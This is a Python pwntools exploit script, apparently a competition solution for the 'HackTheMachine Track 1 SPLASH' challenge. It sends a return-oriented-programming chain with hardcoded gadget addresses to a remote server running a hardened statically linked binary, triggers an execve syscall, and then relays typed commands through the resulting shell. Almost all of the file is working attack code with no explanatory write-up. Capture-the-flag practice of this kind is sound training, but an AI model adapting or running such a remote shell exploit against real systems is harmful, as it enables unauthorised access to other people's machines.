# Theodore Kim / Eric Wikman
# HackTheMachine Track 1 SPLASH

# This exploit targets the hardedned binary file in which a minified glibc
#   was statically compiled with the original binary, then hardened using
#   an obsfucation method in which the instructions are randomly translated
#   to prevent tradition ROP exploits
#   This exploit was developed using ROP gadgets that were consistant amongst
#   several provided samples of the hardened binary to pop and shell.

# This exploit needs the following arguments:
#   python solve_mem.py <binary filename> <server IP address> <server port>

from pwn import *
from time import sleep
import socket
import sys

if len(sys.argv) != 4 :
    print("Format:\n python solve_mem.py <binary filename> <server IP address> <server port>")

filename = sys.argv[1]
ip = sys.argv[2]
port = int(sys.argv[3])

# ROP Payload
command1 = "1 " #2
garbage = "A" * (8) # garbage string to fill up local (8)
attackString = command1 + garbage # (10)
attackString += p64(0x004081b3) + p64(0) + p64(0) + p64(0) # pop rdx (92)
attackString += p64(0x00400121) + p64(59) # pop rax (26)
attackString += p64(0x004032d9) + p64(0x60A080) # pop rdi (42)
attackString += p64(0x00403c78) + p64(0) # pop rsi (58)
attackString += p64(0x407426) # (66)
attackString = attackString[0:-1]

# print(len(attackString)) # Debugging

# Connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

# Start process
s.sendall("sudo " + filename + "\n")
sleep(2) # Make sure that the remote binary is running
s.sendall(attackString + "\n") # send ROP payload

# Get iteractive shell
c = raw_input("$ ") # we should have interactive shell at this point
while (c != "stop") :
     s.sendall(c)
     c = raw_input("$ ")

s.close()
print("DONE")
